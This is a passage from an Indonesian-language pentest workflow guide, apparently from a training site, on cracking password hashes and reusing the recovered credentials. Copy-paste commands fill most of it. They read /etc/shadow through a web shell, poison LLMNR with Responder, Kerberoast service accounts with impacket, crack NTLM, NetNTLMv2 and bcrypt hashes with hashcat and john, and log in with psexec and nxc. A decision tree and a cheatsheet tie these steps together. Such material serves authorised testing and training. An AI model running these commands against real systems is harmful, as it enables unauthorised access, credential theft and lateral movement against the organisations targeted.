# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::

echo "fc525c9683e8fe067095ba2ddc971881" > /tmp/p4.hash
hashcat -m 1000 /tmp/p4.hash /usr/share/wordlists/rockyou.txt --force -O
# Output: fc525c9683e8fe067095ba2ddc971881:Password123!

# Test langsung (atau Pass-The-Hash)
nxc smb $TARGET -u "Administrator" -p "Password123!"
impacket-psexec "Administrator:Password123!@$TARGET"
```

### Pattern 5 — Linux Shadow dari Web Shell

Bash

```
# Kamu punya RCE di web server, download shadow
curl "http://$TARGET/shell.php?cmd=cat+/etc/shadow" > /tmp/shadow_output.txt
grep -v ':\*:\|:!:' /tmp/shadow_output.txt > /tmp/p5.hash

# Identifikasi prefix
head -3 /tmp/p5.hash

# Crack sesuai mode
hashcat -m 1800 /tmp/p5.hash /usr/share/wordlists/rockyou.txt --force -O
john /tmp/p5.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Pattern 6 — NetNTLMv2 dari Responder

Bash

```
# Kamu inject link ke user atau ada LLMNR poisoning
sudo responder -I tun0 -rdwv &

# Tunggu capture...
# Output: diana::CORP:1122334455667788:B92C...:010100...

# Crack
hashcat -m 5600 /tmp/netntlmv2.hash /usr/share/wordlists/rockyou.txt --force
# Output: diana::CORP:...:Winter2023!

# Gunakan password untuk login
nxc smb $TARGET -u "diana" -p "Winter2023!"
# → ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a> Fase 6
```

### Pattern 7 — Kerberoasting Hash dari AD

Bash

```
# Setelah dapat domain user creds, dump TGS
impacket-GetUserSPNs "CORP.LOCAL/diana:Winter2023!" \
    -dc-ip $TARGET -request \
    -outputfile /tmp/kerberoast.hash

cat /tmp/kerberoast.hash
# $krb5tgs$23$*svc_mssql$CORP.LOCAL$...

hashcat -m 13100 /tmp/kerberoast.hash \
    /usr/share/wordlists/rockyou.txt --force
# Output: $krb5tgs$23$...:SQLAdminPass1

# Gunakan password service account
nxc mssql $TARGET -u "svc_mssql" -p "SQLAdminPass1"
# → ke <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
```

### Pattern 8 — bcrypt dari Web App Database

Bash

```
# Dapat dari SQL injection atau DB dump
# $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

echo '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy' > /tmp/p8.hash

# WAJIB -w 1 di VM, ini akan lambat
hashcat -m 3200 /tmp/p8.hash /usr/share/wordlists/rockyou.txt -w 1 --force

# Estimasi: bcrypt di VM CPU bisa 40+ jam untuk full rockyou
# Prioritaskan: coba top 1000 dulu
head -1000 /usr/share/wordlists/rockyou.txt > /tmp/top1000.txt
hashcat -m 3200 /tmp/p8.hash /tmp/top1000.txt -w 1 --force

# Jika tidak crack dalam 30 menit, pertimbangkan:
# 1. Apakah ada password hint dari info lain?
# 2. Bisa skip dan fokus ke vector lain?
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`No hashes loaded`|File kosong, path salah, encoding aneh|`cat hash.txt` cek isinya; `dos2unix hash.txt`|
|`Separator unmatched`|Format hash butuh delimiter tapi hilang/kelebihan|Cek format: NetNTLMv2 harus full baris|
|`Token length exception`|Hash mode salah, panjang tidak cocok|Reidentifikasi dengan `nth` / `hashid`|
|`CL_OUT_OF_RESOURCES`|RAM VM habis|Kurangi `-w 1`, hapus flag `-O`|
|`Exhausted`|Password tidak ada di wordlist|Tambah rules, ganti wordlist, coba mask|
|`All hashes found in potfile`|Sudah pernah dicrack|`hashcat --show` untuk lihat hasilnya|
|`No password hashes loaded` (john)|Format tidak dikenali|`--format=raw-md5` atau sesuai tipe|
|`not an RSA key` (ssh2john)|Format OpenSSH baru|`python3 /usr/share/john/ssh2john.py`|
|`CRLF line terminators`|File dari Windows|`dos2unix hash.txt wordlist.txt`|
|Hashcat freeze (bcrypt)|bcrypt sangat CPU-intensive|`-w 1`, limit cores: `taskset -c 0,1 hashcat ...`|
|`Invalid argument: Permission denied`|Output dir tidak writable|Ganti ke `/tmp/` atau `~/`|
|`Unrecognized option`|Typo di parameter|Cek dokumentasi: `hashcat --help`|
|`0 password hashes cracked` (john)|Wordlist habis|Tambah `--rules=best64`, ganti wordlist|
|Hash punya salt tapi crack gagal|Salt tidak diikutkan|Format: `hash:salt` atau gunakan john|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Dapat Hash / File Terproteksi
│
├─ FASE 0: Sumber Hash
│   ├─ /etc/shadow    → unshadow + john / hashcat -m 1800/500/7400
│   ├─ Windows SAM    → secretsdump → cut kolom NT → hashcat -m 1000
│   ├─ Network cap    → Responder logs → hashcat -m 5600
│   ├─ File ZIP/SSH   → *2john → john
│   └─ Hash biasa     → Langsung ke Fase 1
│
├─ FASE 1: Identifikasi
│   ├─ nth + hashid → dapat Hashcat mode
│   └─ Cek online (CrackStation/Hashes.com) → jika ada, SELESAI
│
├─ FASE 2: Pilih Strategi
│   ├─ Hash cepat (MD5/NTLM)  → Agresif: rockyou + rules
│   ├─ Hash sedang (SHA512)   → Sabar: rockyou only dulu
│   └─ Hash lambat (bcrypt)   → Minimal: top-1000 + pertimbangkan skip
│
├─ FASE 3: Hashcat (Hash biasa)
│   ├─ Step 1: rockyou + no rules   → jika Exhausted →
│   ├─ Step 2: rockyou + best64     → jika Exhausted →
│   ├─ Step 3: rockyou + rockyou-30000 → jika Exhausted →
│   ├─ Step 4: Mask attack (PIN/format diketahui) → jika gagal →
│   └─ Step 5: Custom wordlist (CeWL/CUPP/Crunch)
│
├─ FASE 4: John (File format)
│   ├─ zip2john/ssh2john/pdf2john/keepass2john
│   ├─ john + rockyou → jika gagal →
│   └─ john + rules / mask
│
├─ FASE 5: Advanced (semua gagal)
│   ├─ Cari password hint dari file loot
│   ├─ Context wordlist dari nama perusahaan
│   ├─ Google dork untuk hash leak
│   └─ SecLists wordlist alternatif
│
└─ FASE 6: Post-Crack
    ├─ Simpan credentials terstruktur
    ├─ Test ke semua service (SMB/SSH/WinRM/RDP/DB)
    └─ Pivot sesuai service yang berhasil
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export HASH_DIR=~/crack_session
mkdir -p $HASH_DIR/{hashes,wordlists,cracked}
export MODE=0  # ubah sesuai tipe hash

# === IDENTIFIKASI ===
nth --text "HASH_HERE"
hashid -m -j "HASH_HERE"

# === ONLINE LOOKUP ===
# Buka: crackstation.net | hashes.com | md5decrypt.net

# === EKSTRAKSI FILE ===
zip2john file.zip > hash.txt
ssh2john id_rsa > hash.txt
keepass2john db.kdbx > hash.txt
pdf2john doc.pdf > hash.txt
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt

# === HASHCAT HIERARCHY ===
hashcat -m $MODE hash.txt /usr/share/wordlists/rockyou.txt --force -O
hashcat -m $MODE hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O
hashcat -m $MODE hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat -m $MODE hash.txt -a 3 '?d?d?d?d?d?d' --force      # 6-digit PIN
hashcat -m $MODE hash.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?d' --force  # word+4digit

# === JOHN HIERARCHY ===
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
john hash.txt --show

# === HASH POPULER ===
hashcat -m 1000 ntlm.hash rockyou.txt --force -O           # NTLM Windows
hashcat -m 5600 netntlmv2.hash rockyou.txt --force         # NetNTLMv2 Responder
hashcat -m 13100 kerberoast.hash rockyou.txt --force       # Kerberoasting
hashcat -m 18200 asrep.hash rockyou.txt --force            # ASREPRoast
hashcat -m 1800 shadow.hash rockyou.txt --force -O         # Linux SHA-512
hashcat -m 3200 bcrypt.hash rockyou.txt -w 1 --force       # bcrypt (lambat!)

# === POST-CRACK VALIDATION ===
hashcat -m $MODE hash.txt --show
nxc smb $TARGET -u "user" -p "crackedpass"
nxc winrm $TARGET -u "user" -p "crackedpass"
nxc ssh $TARGET -u "user" -p "crackedpass"
```

---

> **➡️ NEXT:** Setelah berhasil crack credentials dan validasi ke service target, lanjut ke:
> 
> - Shell via WinRM → **`<a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>`**
> - Shell via SSH → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`**
> - Credentials untuk AD → **`<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`**
> - Kerberoast hash cracked → **`<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>`**
> 
> **← SEBELUMNYA:** **[⚡ Quick Start: Urutan Kerja OSINT (Untuk Pemula)](/docs/osint)** — OSINT untuk password profiling (CUPP), dorking credential leak, dan pemetaan digital footprint target sebelum cracking.